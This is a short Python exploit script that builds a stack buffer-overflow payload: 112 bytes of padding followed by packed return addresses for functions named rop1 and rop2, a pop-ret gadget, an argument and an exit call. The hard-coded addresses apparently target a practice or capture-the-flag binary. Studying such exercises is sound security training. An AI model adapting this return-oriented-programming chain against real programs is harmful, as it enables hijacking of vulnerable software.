import sys
import struct

pop_ret = 0x5655601e
rop1 = 0x565561ad
rop2 = 0x565561d8
exit_dir = 0xf7da6ad0
# Build the stack
# Overflow
payload = b"A"*112

# Address of rop1()
payload += struct.pack("I", rop1)

# Address of rop2(), address of pop ret and an argument for rop2()
payload += struct.pack("I", rop2)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeaddead)

# exit
payload += struct.pack("I", exit_dir)

sys.stdout.buffer.write(payload)
